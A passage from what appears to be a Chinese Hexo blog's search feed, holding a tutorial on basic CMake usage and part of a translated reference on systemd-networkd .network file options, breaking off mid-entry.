armbian</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux系统配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmake基本使用</title>
      <link href="/2023/02/07/cmake%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/02/07/cmake%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="cmake基本使用"><a href="#cmake基本使用" class="headerlink" title="cmake基本使用"></a>cmake基本使用</h1><h3 id="1-cmake是什么"><a href="#1-cmake是什么" class="headerlink" title="1.cmake是什么?"></a>1.cmake是什么?</h3><p>cmake是一种项目构建工具，在cmake出现之前我们一般使用make进行项目构建，但是makefile编写比较复杂，因此cmake应运而生，使用cmake只需要编写简单的CMakeLists.txt，cmake会根据CMakeLists.txt生成对应的makefile。</p><h3 id="2-cmake的安装和配置"><a href="#2-cmake的安装和配置" class="headerlink" title="2.cmake的安装和配置"></a>2.cmake的安装和配置</h3><h4 id="1-cmake安装"><a href="#1-cmake安装" class="headerlink" title="1.cmake安装"></a>1.cmake安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmake <span class="comment">#基于ubuntu/debian</span></span><br></pre></td></tr></table></figure><h4 id="2-cmake配置"><a href="#2-cmake配置" class="headerlink" title="2.cmake配置"></a>2.cmake配置</h4><p>cmake使用一般要设定两个环境变量，如果工程使用的包含文件或者库文件放在非默认路径下，则需要使用设置该环境变量来弥补</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CMAKE_INCLUDE_PATH=/usr/include</span><br><span class="line"><span class="built_in">export</span> CMAKE_LIBRARY_PATH=/usr/lib</span><br></pre></td></tr></table></figure><h3 id="3-CMakeLists-txt的编写规则"><a href="#3-CMakeLists-txt的编写规则" class="headerlink" title="3.CMakeLists.txt的编写规则"></a>3.CMakeLists.txt的编写规则</h3><p>脚本关键字一般使用大写，当然使用小写也是可以的</p><h5 id="1-CMAKE-MINIMUM-REQUIRED"><a href="#1-CMAKE-MINIMUM-REQUIRED" class="headerlink" title="1.CMAKE_MINIMUM_REQUIRED"></a>1.CMAKE_MINIMUM_REQUIRED</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMAKE_MINIMUM_REQUIRED</span>(VERSION <span class="variable">$&#123;VERSION&#125;</span>)</span><br><span class="line"><span class="comment">#用于指定该cmake脚本兼容的最低cmake版本</span></span><br><span class="line"><span class="keyword">CMAKE_MINIMUM_REQUIRED</span>(VERSION <span class="number">3.12</span>)</span><br><span class="line"><span class="comment">#这里表明cmake兼容的最低版本为3.12</span></span><br></pre></td></tr></table></figure><h4 id="2-PROJECT"><a href="#2-PROJECT" class="headerlink" title="2.PROJECT"></a>2.PROJECT</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PROJECT</span>(project_name <span class="variable">$&#123;program_language&#125;</span>)</span><br><span class="line"><span class="comment">#指定该项目的名称和该项目支持的变成语言</span></span><br><span class="line"><span class="keyword">PROJECT</span>(shadowsocks-libev C )</span><br><span class="line"><span class="comment">#这里指定项目名称为shadowsocks-libev,支持的变成语言为C,如果不指定此项默认支持所有变成语言</span></span><br></pre></td></tr></table></figure><h4 id="3-INCLUDE-DIRECTORY"><a href="#3-INCLUDE-DIRECTORY" class="headerlink" title="3.INCLUDE_DIRECTORY"></a>3.INCLUDE_DIRECTORY</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INCLUDE_DIRECTORIES</span>(<span class="variable">$&#123;PATH&#125;</span>)</span><br><span class="line"><span class="comment">#指定包含头文件的包含路径</span></span><br><span class="line"><span class="keyword">INCLUDE_DIRECTORIES</span>(/usr/<span class="keyword">include</span>)</span><br><span class="line"><span class="comment">#指定项目头文件的包含路径为/usr/include</span></span><br></pre></td></tr></table></figure><h4 id="4-LINK-DIRECTORIES"><a href="#4-LINK-DIRECTORIES" class="headerlink" title="4.LINK_DIRECTORIES"></a>4.LINK_DIRECTORIES</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LINK_DIRECTORIES</span>(<span class="variable">$&#123;PATH&#125;</span>)</span><br><span class="line"><span class="comment">#指定链接库的路径</span></span><br><span class="line"><span class="keyword">LINK_DIRECTORIES</span>(/usr/lib)</span><br><span class="line"><span class="comment">#指定链接库的路径为/usr/lib</span></span><br></pre></td></tr></table></figure><h4 id="5-SET"><a href="#5-SET" class="headerlink" title="5.SET"></a>5.SET</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>(PARAM VALUE)</span><br><span class="line"><span class="comment">#设置变量</span></span><br><span class="line"><span class="keyword">SET</span>(EXECUTABLE bin)</span><br><span class="line"><span class="comment">#这里设定变量EXECUTABLE为bin</span></span><br><span class="line"><span class="comment">#SET选项一般设置一些关键的环境变量，例如，输出的可执行程序的输出路径，包含文件的查找路径，包含库文件的查找路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常用的关键变量</span></span><br><span class="line">LIBRARY_OUTPUT_PATH <span class="comment">#生成的库文件的生成目录</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH <span class="comment">#生成的可执行文件的生成目录</span></span><br><span class="line">CMAKE_C_COMPILER    <span class="comment">#指定cmake使用什么编译器进行编译项目</span></span><br><span class="line">CMAKE_CXX_COMPILER   <span class="comment">#指定cmake使用什么c++编译器进行编译项目</span></span><br></pre></td></tr></table></figure><h4 id="6-ADD-LIBRARY"><a href="#6-ADD-LIBRARY" class="headerlink" title="6.ADD_LIBRARY"></a>6.ADD_LIBRARY</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(&lt;name&gt; STATIC/SHARED/MODULE &lt;source&gt;)</span><br><span class="line"><span class="comment">#指定源代码路径以及生成的库的类型和名称</span></span><br><span class="line"><span class="comment">#&lt;name&gt;为指定生成库的名称</span></span><br><span class="line"><span class="comment">#STATIC/SHARED 指定生成静态或者动态库</span></span><br><span class="line"><span class="comment">#&lt;source&gt;指定源代码的路径</span></span><br></pre></td></tr></table></figure><h4 id="7-AUX-SOURCE-DIRECTORY"><a href="#7-AUX-SOURCE-DIRECTORY" class="headerlink" title="7.AUX_SOURCE_DIRECTORY"></a>7.AUX_SOURCE_DIRECTORY</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AUX_SOURCE_DIRECTORY</span>(src SOURCE_DIR)</span><br><span class="line"><span class="comment">#扫描一个目录的文件并将该目录的文件定义成一个变量</span></span><br></pre></td></tr></table></figure><h4 id="8-其他常用的关键字"><a href="#8-其他常用的关键字" class="headerlink" title="8.其他常用的关键字"></a>8.其他常用的关键字</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TARGET_LINK_DIRECTORIES</span></span><br><span class="line"><span class="keyword">TARGET_LINK_DIRECTORIES</span>(/usr/lib)</span><br><span class="line"><span class="comment">#指定目标文件链接的库路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">TARGET_INCLUDE_DIRECTORIES</span></span><br><span class="line">TARGET_INCLUDED_DIRECTORIES(/usr/<span class="keyword">include</span>)</span><br><span class="line"><span class="comment">#指定生成的目标文件链接的头文件目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MESSAGE</span></span><br><span class="line"><span class="keyword">MESSAGE</span>(type<span class="string">&quot;$&#123;message&#125;&quot;</span>)</span><br><span class="line">type</span><br><span class="line"><span class="number">1</span>.STATUS 非重要信息</span><br><span class="line"><span class="number">2</span>.WARNING 警告信息，会继续执行</span><br><span class="line"><span class="number">3</span>.AUTHOR_WARNING 警告信息(dev)，会继续执行</span><br><span class="line"><span class="number">4</span>.SEND_ERROR 错误，继续执行，但是会跳过生辰步骤</span><br><span class="line"><span class="number">5</span>.FATAL_ERROR 错误，终止所有处理过程</span><br><span class="line"><span class="comment">#输出打印信息，如果不指定type则默认STATUS类型</span></span><br><span class="line"><span class="keyword">MESSAGE</span>(FATAL_ERROR <span class="string">&quot;FATAL error&quot;</span>)</span><br><span class="line"><span class="comment">#输出信息错误FATAL error，并且终止cmake执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">OPTION</span>(WITH_STATIC <span class="string">&quot;build with static libraries&quot;</span> <span class="keyword">ON</span>)</span><br><span class="line"><span class="comment">#给用户一个选择，如果用户在编译的时候没有进行传参则使用默认值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET_TARGET_PROPERTIES</span>(hello_static PROPERTIES OUTPUT_NAME <span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment">#设置hello_static库文件输出文件名为hello</span></span><br></pre></td></tr></table></figure><h3 id="4-cmake使用方法"><a href="#4-cmake使用方法" class="headerlink" title="4.cmake使用方法"></a>4.cmake使用方法</h3><p>在构建cmake项目的时候我们一般会在项目的根目录建立一个build目录，然后将生成的目标文件以及中间文件生成在build目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$PROJECT</span> &amp;&amp; <span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> build &amp;&amp; cmake .. &amp;&amp; make</span><br><span class="line"><span class="comment">#如果希望传递一些变量给cmake进行控制一些参数</span></span><br><span class="line">cmake -DCMAKE_C_COMPILER=clang</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux网络管理工具</title>
      <link href="/2023/01/07/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/01/07/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux网络管理工具"><a href="#Linux网络管理工具" class="headerlink" title="Linux网络管理工具"></a>Linux网络管理工具</h1><h2 id="1-systemd-networkd"><a href="#1-systemd-networkd" class="headerlink" title="1.systemd-networkd"></a>1.systemd-networkd</h2><p>systemd自带的网络管理工具，一般仅用于有线网卡的网络配置或者是不需要验证的无线网络配置</p><h4 id="1-描述"><a href="#1-描述" class="headerlink" title="1.描述"></a>1.描述</h4><p>网络配置的操作由 <a href="http://www.jinbuguo.com/systemd/systemd-networkd.service.html#">systemd-networkd.service(8)</a> 执行。<br>注意，网络设备的Network文件必须以 <code>.network</code> 作为后缀名，否则将被忽略。 一旦与Network文件匹配的网卡出现，对应的Network文件就会立即生效。</p><p>Network文件分别位于： 系统网络目录(<code>/usr/lib/systemd/network</code>)、 运行时网络目录(<code>/run/systemd/network</code>)、 本机网络目录(<code>/etc/systemd/network</code>)。 所有的Network文件(无论位于哪个目录中)，统一按照文件名的字典顺序处理。 对于不同目录下的同名Network文件，仅以优先级最高的目录中的那一个为准。 具体说来就是：<code>/etc/</code> 的优先级最高、 <code>/run/</code> 的优先级居中、<code>/usr/lib/</code> 的优先级最低。 如果系统管理员想要屏蔽 <code>/usr/lib/</code> 目录中的某个Network文件， 那么最佳做法是在 <code>/etc/</code> 目录中创建一个指向 <code>/dev/null</code> 的同名符号链接， 即可彻底屏蔽 <code>/usr/lib/</code> 目录中的同名文件。</p><p>对于例如 <code>foo.network</code> 这样的Network文件，可以同时存在对应的 <code>foo.network.d/</code> 目录，当解析完Network文件之后，目录中所有以 “<code>.conf</code>“ 结尾的文件，都会被按照文件名的字典顺序，依次解析(相当于依次附加到Network文件的末尾)。 这样就可以方便的修改Network文件，或者为Network文件添加额外的设置，而无需修改Network文件本身。 注意，所有配置片段(“<code>.conf</code>“ 文件)必须包含明确的小节头(例如 “<code>[Match]</code>“ 之类)。</p><p>“<code>.d</code>“ 目录除了可以放置在 <code>/etc/systemd/network</code> 目录中， 还可以放置在 <code>/usr/lib/systemd/network</code> 与 <code>/run/systemd/network</code> 目录中。 所有 “<code>.d/</code>“ 目录中的配置片段都会覆盖Network文件的设置(无论Network文件位于哪个目录)。 虽然在优先级上，<code>/etc</code> 中的配置片段优先级最高、 <code>/run</code> 中的配置片段优先级居中、<code>/usr/lib</code> 中的配置片段优先级最低。 但是由于 <code>/run</code> 是临时目录，而 <code>/usr/lib</code> 仅供软件包使用， 所以在实践中，”<code>.d/</code>“ 目录仅会放置在 <code>/etc/systemd/network</code> 目录中。</p><p>注意，如果某个网络接口既没有配置静态IPv6地址、也没有启用DHCPv6或IPv6LL的话， 将会被视为禁用IPv6支持。同时，systemd 将会自动向 <code>/proc/sys/net/ipv6/conf/_`ifname`_/disable_ipv6</code> 中写入”1”，以彻底禁用此接口上的IPv6支持。</p><h4 id="2-配置选项"><a href="#2-配置选项" class="headerlink" title="2.配置选项"></a>2.配置选项</h4><h5 id="1-Match"><a href="#1-Match" class="headerlink" title="1.Match"></a>1.Match</h5><p>Network文件中的Match选项用于描述需要配置的网卡的指定信息，如果同一块网卡有多个network文件，则以第一个匹配的文件配置信息为准。</p><h6 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h6><p>网卡的名称(网卡内核中INTERFACE的属性值)<br>匹配网卡的 “<code>INTERFACE</code>“ 属性值(网卡的内核名称)。 </p><h6 id="MACAddress"><a href="#MACAddress" class="headerlink" title="MACAddress"></a>MACAddress</h6><p>匹配网卡的物理地址。接受一个空白符分隔的MAC地址列表。 每个MAC地址都以冒号(:)、连字符(-)、句点(.)分隔的十六进制数表示(参见下例)。 可以多次使用此选项，表示融合多个列表。设为空字符串表示清空先前已经设置的列表。<br>例子：MACAddress&#x3D;01:23:45:67:89:ab 00-11-22-33-44-55 AABB.CCDD.EEFF</p><h6 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h6><p>匹配网卡的 “<code>DRIVER</code>“ 属性值(网卡的驱动名称)。 接收一个空格分隔的匹配模式列表(使用shell风格的通配符)。 注意，如果网卡的 “<code>DRIVER</code>“ 属性不存在， 那么将使用 “<code>ethtool -i</code>“ 命令中输出的驱动名称。 可以在列表前加上”!”前缀 表示反转。</p><h6 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h6><p>匹配系统的主机名(hostname)或”machine ID”， 参见 <a href="http://www.jinbuguo.com/systemd/systemd.unit.html#">systemd.unit(5)</a> 中的 “<code>ConditionHost=</code>“ 选项。</p><h5 id="2-Link"><a href="#2-Link" class="headerlink" title="2.Link"></a>2.Link</h5><p>可在 “<code>[Link]</code>“ 小节中使用如下选项对网卡进行设置：</p><h6 id="MACAddress-1"><a href="#MACAddress-1" class="headerlink" title="MACAddress"></a>MACAddress</h6><p>设置网卡的物理地址(MAC地址)</p><h6 id="MTUBytes"><a href="#MTUBytes" class="headerlink" title="MTUBytes"></a>MTUBytes</h6><p>设置网卡的最大传输单元(MTU)。 可以使用 以1024为基准的 K, M, G 后缀。</p><p>注意，如果为网卡开启了IPv6支持， 那么设置任何小于 1280 的值都将被自动修正为 1280(IPv6的MTU最小值)。</p><h6 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h6><p>接受一个布尔值。表示是否开启 ARP(Address Resolution Protocol) 支持。 若未设置此选项，则使用内核的默认值。</p><p>当在单个底层物理网卡上创建多个虚拟 MACVLAN 或 VLAN 设备时， 禁用ARP就非常有用了。 因为此时的底层物理网卡仅用于汇聚流量， 而并不参与任何网络操作。</p><h6 id="Multicast"><a href="#Multicast" class="headerlink" title="Multicast"></a>Multicast</h6><p>接受一个布尔值。表示是否开启设备的多播标记。</p><h6 id="AllMulticast"><a href="#AllMulticast" class="headerlink" title="AllMulticast"></a>AllMulticast</h6><p>接受一个布尔值。表示驱动程序是否从网络提取所有多播数据包。 启用多播路由时将会发生这种情况。</p><h6 id="Unmanaged"><a href="#Unmanaged" class="headerlink" title="Unmanaged"></a>Unmanaged</h6><p>接受一个布尔值。 默认值为 “<code>no</code>“ 。 若设为 “<code>yes</code>“ 则表示不使用 systemd 管理此设备， 在效果上相当于没有匹配到此设备。</p><p>当你希望 使用 systemd 之外的其他程序来管理网络设备时， 可以使用此选项。</p><h6 id="RequiredForOnline"><a href="#RequiredForOnline" class="headerlink" title="RequiredForOnline"></a>RequiredForOnline</h6><p>接受一个布尔值。默认值 “<code>yes</code>“ 表示当 “<code>systemd-networkd-wait-online</code>“ 检查网络是否在线时， 此网络必须在线(否则一直等到它在线)。 设为 “<code>no</code>“ 表示 忽略此网络(不检查此网络的状态)。</p><p>无论此选项如何设置，都会正常启动此网络。 只不过当 “<code>RequiredForOnline=no</code>“ 时， 如果此网络不在线(例如未能从 DHCP 获取IP地址、或者网线被拔出等原因)， 那么 “<code>systemd-networkd-wait-online</code>“ 将会自动跳过它。</p><h5 id="3-Network"><a href="#3-Network" class="headerlink" title="3.Network"></a>3.Network</h5><p>可在 “<code>[Network]</code>“ 小节中使用如下选项对网卡进行设置：</p><h6 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h6><p>对网卡的 描述</p><h6 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h6><p>DHCPv4&#x2F;DHCPv6 客户端支持。可以设为 “<code>yes</code>“, “<code>no</code>“, “<code>ipv4</code>“, “<code>ipv6</code>“ 之一。默认值为 “<code>no</code>“ 。</p><p>注意，当 “<code>IPv6AcceptRA=yes</code>“ 时， 无论此选项如何设置，DHCPv6 都将被无条件的启用。 若明确开启了 DHCPv6 支持， 那么无论在此连接上是否存在路由器、也无论路由器传递了什么样的标记(flag)， 都会无条件的启动 DHCPv6 客户端。参见下文的 “<code>IPv6AcceptRA=</code>“ 选项。</p><p>注意，默认情况下， DHCP服务器分配的域名并不用于名字解析。 参见下面的 <code>UseDomains=</code> 选项。</p><p>参见下面的 “<code>[DHCP]</code>“ 小节， 以了解更多DHCP客户端配置选项。</p><h6 id="DHCPServer"><a href="#DHCPServer" class="headerlink" title="DHCPServer"></a>DHCPServer</h6><p>接受一个布尔值。表示是否在此网络上启动内置的 DHCPv4 服务器。 默认值为 “<code>no</code>“ 。 进一步的设置参见下面的 “<code>[DHCPServer]</code>“ 小节。</p><h6 id="LinkLocalAddressing"><a href="#LinkLocalAddressing" class="headerlink" title="LinkLocalAddressing"></a>LinkLocalAddressing</h6><p>链路本地地址自动配置。可设为 “<code>yes</code>“, “<code>no</code>“, “<code>ipv4</code>“, “<code>ipv6</code>“ 之一。 默认值为 “<code>ipv6</code>“</p><h6 id="IPv4LLRoute"><a href="#IPv4LLRoute" class="headerlink" title="IPv4LLRoute"></a>IPv4LLRoute</h6><p>接受一个布尔值。表示是否为 non-IPv4LL 主机与 IPv4LL-only 主机之间的通信提供路由支持。默认值是 no 。 [译者注]”IPv4LL”(IPv4 Link-Local)又称为”<a href="http://www.zeroconf.org/">ZEROCONF</a>“， 可用于在没有DHCP服务器的网络中自动配置IP地址。</p><h6 id="IPv6Token"><a href="#IPv6Token" class="headerlink" title="IPv6Token"></a>IPv6Token</h6><p>一个前64位为空的IPv6地址。 用于设置该连接的 SLAAC IPv6 地址的64位接口部分。 注意，该值仅用于 SLAAC 而不是用于 DHCPv6 (即使 IPv6 Router Advertisement 明确要求 DHCP)。 默认值为自动生成。</p><h6 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h6><p>接受一个布尔值。默认值 yes 表示支持 本地链路多播名称解析(<a href="https://tools.ietf.org/html/rfc4795">Link-Local Multicast Name Resolution</a>)，而 no 则表示关闭。 也可以设为 “<code>resolve</code>“ 表示仅支持解析，但不支持主机注册与宣布。 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 会读取此选项的值。 [译者注]”LLMNR”(mDNS)可用于在没有DNS的局域网内自动发现(通过组播)本地网段上的主机。</p><h6 id="MulticastDNS"><a href="#MulticastDNS" class="headerlink" title="MulticastDNS"></a>MulticastDNS</h6><p>接受一个布尔值。设为 yes 表示支持 组播DNS(<a href="https://tools.ietf.org/html/rfc6762">Multicast DNS</a>)，而默认值 no 则表示关闭。 也可以设为 “<code>resolve</code>“ 表示仅支持解析，但不支持主机或服务注册与宣布。 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 会读取此选项的值。 [译者注]”mDNS”(multicast DNS)可用于在没有DNS的局域网内自动发现(通过组播)本地网段上的主机&#x2F;服务(例如FTP)。</p><h6 id="DNSOverTLS"><a href="#DNSOverTLS" class="headerlink" title="DNSOverTLS"></a>DNSOverTLS</h6><p>接受一个布尔值或特殊值 “<code>opportunistic</code>“ 。 设为 yes 表示为此连接开启 <a href="https://tools.ietf.org/html/rfc7858">DNS-over-TLS</a> 支持。设为 “<code>opportunistic</code>“ 表示优先使用 DNS-over-TLS 但也向下兼容不支持 DNS-over-TLS 的DNS服务器。 此选项实际上是针对每个网口覆盖了 <a href="http://www.jinbuguo.com/systemd/resolved.conf.html#">resolved.conf(5)</a>‘s 中的全局 <code>DNSOverTLS=</code> 设置。默认值为 no 。 此选项将被 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 读取。</p><h6 id="DNSSEC"><a href="#DNSSEC" class="headerlink" title="DNSSEC"></a>DNSSEC</h6><p>接受一个布尔值或特殊值 “<code>allow-downgrade</code>“ 。设为 yes 表示支持 <a href="https://tools.ietf.org/html/rfc4033">DNSSEC</a> ，而默认值 no 则表示关闭。 也可以设为 “<code>allow-downgrade</code>“ 表示允许降级到普通的DNS协议， 以兼容不具备DNSSEC的网络环境。 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 会读取此选项的值。 此选项实际上是针对每个网口覆盖了 <a href="http://www.jinbuguo.com/systemd/resolved.conf.html#">resolved.conf(5)</a> 中的全局 <code>DNSSEC=</code> 设置。</p><h6 id="DNSSECNegativeTrustAnchors"><a href="#DNSSECNegativeTrustAnchors" class="headerlink" title="DNSSECNegativeTrustAnchors"></a>DNSSECNegativeTrustAnchors</h6><p>可设为一个 空格分隔的域名列表。 当通过该网口的DNS服务器查询列表中的域名(含子域名)时， 无需验证应答的正确性。 常用于 禁用某些私有域名的DNSSEC验证。 因为这些私有域名 无法在互联网DNS服务器上进行验证。 默认值为空。 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 会读取此选项的值。</p><h6 id="LLDP"><a href="#LLDP" class="headerlink" title="LLDP"></a>LLDP</h6><p>LLDP是一个二层协议，使得接入网络的一台设备可以将其主要的能力、管理地址、设备标识、接口标识等信息 发送给接入同一个局域网的其他设备。通常只有专业的路由器才会支持LLDP协议。 若设为 yes 则表示接收所有以太网LLDP(链路层发现协议)包，并且维护一个记录了所有LLDP邻居的数据库。 而 no 则表示彻底禁用LLDP支持。 默认值 “<code>routers-only</code>“ 表示仅收集各种路由器LLDP数据， 而忽略所有其他设备的LLDP数据(例如”电话”之类)。 可以用 <a href="http://www.jinbuguo.com/systemd/networkctl.html#">networkctl(1)</a> 查询所有收集到的邻居数据。LLDP仅可用于以太网。 下面的 <code>EmitLLDP=</code> 可用于接收本机发出的LLDP包。</p><h6 id="EmitLLDP"><a href="#EmitLLDP" class="headerlink" title="EmitLLDP"></a>EmitLLDP</h6><p>如何发送以太网链路层发现协议(LLDP)数据包。 可以设为一个布尔值或者特殊值 “<code>nearest-bridge</code>“, “<code>non-tpmr-bridge</code>“, “<code>customer-bridge</code>“ 之一。 默认值 no 表示不发送任何LLDP数据包。 no 之外的其他值都表示周期性的发送包含本机配置信息的LLDP数据包。 LLDP数据包中包含了本机的如下信息：主机名(hostname)、machine ID (参见 <a href="http://www.jinbuguo.com/systemd/machine-id.html#">machine-id(5)</a>)、 本地网络接口的名称、 pretty 主机名(参见 <a href="http://www.jinbuguo.com/systemd/machine-info.html#">machine-info(5)</a>)。 LLDP仅可用于以太网链路。 由于LLDP数据包中包含了精确标识主机的敏感信息，所以切勿在不可信的网络环境中使用。 开启此选项之后，其他系统就可以通过本机发送的LLDP数据包，辨别其所连接的本机网络接口究竟是哪一个。 三个特殊值控制着如何传输LLDP数据包： “<code>nearest-bridge</code>“ 表示仅允许传输到最近连接的桥，这是最严苛的传输方式； “<code>non-tpmr-bridge</code>“ 表示仅允许跨越 Two-Port MAC 传输，但是不允许传输到另外的桥； “<code>customer-bridge</code>“ 表示一直传输到到达一个”customer bridge”(详见 <a href="https://standards.ieee.org/findstds/standard/802.1AB-2016.html">IEEE 802.1AB-2016</a>)。 设为 yes 与设为 “<code>nearest-bridge</code>“ 等价。 参见上文的 <code>LLDP=</code> 选项 以了解更多有关LLDP的含义。</p><h6 id="BindCarrier"><a href="#BindCarrier" class="headerlink" title="BindCarrier"></a>BindCarrier</h6><p>可设为一个网口列表，用于控制当前网口的行为： (1)当列表中的所有网口都处于停用状态(down)的时候，该网口也会被停用。 (2)当列表中的某个网口被启用的时候，该网口也会被启用。</p><h6 id="Address"><a href="#Address" class="headerlink" title="Address"></a>Address</h6><p>一个符合 <a href="http://man7.org/linux/man-pages/man3/inet_pton.3.html">inet_pton(3)</a> 格式的 静态IPv4或IPv6地址及掩码位数 (用 “<code>/</code>“ 字符分隔)。 当 [Address] 小节(见下文)中只含有 <code>Address=</code> 时， 此选项相当于是 [Address] 小节的速记。 可以多次使用此选项以指定多个IP地址。</p><p>如果设置的地址是”0.0.0.0”(IPv4) 或 “[::]”(IPv6)， 那么将首先检查所有当前已配置的网络接口以及所有网络配置文件， 然后按照所需地址段的大小， 自动从系统的可用地址池中分配一个新地址段， 并确保不发生任何地址段冲突。 系统默认的IPv4可用地址池如下： 192.168.0.0&#x2F;16, 172.16.0.0&#x2F;12, 10.0.0.0&#x2F;8 ； 系统默认的IPv6可用地址池如下：fc00::&#x2F;7 。 此选项主要用于管理大量动态创建的、 拥有相同网络配置的、需要自动分配地址段的 网络接口。</p><h6 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h6><p>一个 符合 <a href="http://man7.org/linux/man-pages/man3/inet_pton.3.html">inet_pton(3)</a> 格式的网关地址。可以多次使用此选项以指定多个网关。 当 [Route] 小节(见下文)中只含有 <code>Gateway=</code> 时， 此选项相当于是 [Route] 小节的速记。</p><h6 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h6><p>一个 符合 <a href="http://man7.org/linux/man-pages/man3/inet_pton.3.html">inet_pton(3)</a> 格式的DNS服务器地址。可以多次使用此选项以指定多个DNS服务器。 <a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 会读取此选项的值。</p><h6 id="Domains"><a href="#Domains" class="headerlink" title="Domains"></a>Domains</h6><p>接受一个应该使用此连接的DNS服务器解析的域列表， 列表中的每一项都必须是一个域(可以带有可选的 “<code>~</code>“ 前缀)。 带有 “<code>~</code>“ 前缀的域被称为”路由域”，而不带前缀的域则被称为”搜索域”。 在将单标签主机名(不含”.”的主机名)扩展为FQDN(全限定域名)时，将会首先把”搜索域”用作搜索后缀。 当在此连接上解析一个单标签主机名时，列表中的每一个搜索域都将被依次添加为后缀， 以拼接成一个可用于解析的全限定域名， 直到某一个能够被解析成功为止。</p><p>列表中的域(包括搜索域与路由域)都可以用于路由DNS查询请求： 对于那些后缀位于此列表中的主机名(如果存在”搜索域”的话，那么还包括单标签主机名)的DNS查询请求，将会被路由到此连接的DNS服务器上。 对于同时承载多个域的主机来说，如果希望在不同的网络接口上拥有不同的私有DNS区域， 那么可以使用此处的域名路由逻辑。</p><p>特殊值 “<code>~.</code>“ (前面的波浪号表示这是一个”路由域”，后面的点表示根域(也就是所有域的后缀))拥有特殊的含义， 它表示将所有未能匹配其他域名路由规则的DNS请求，路由到此连接的DNS服务器上。 利用这个特殊值， 可以设置一组默认的DNS服务器。</p><p><a href="http://www.jinbuguo.com/systemd/systemd-resolved.service.html#">systemd-resolved.service(8)</a> 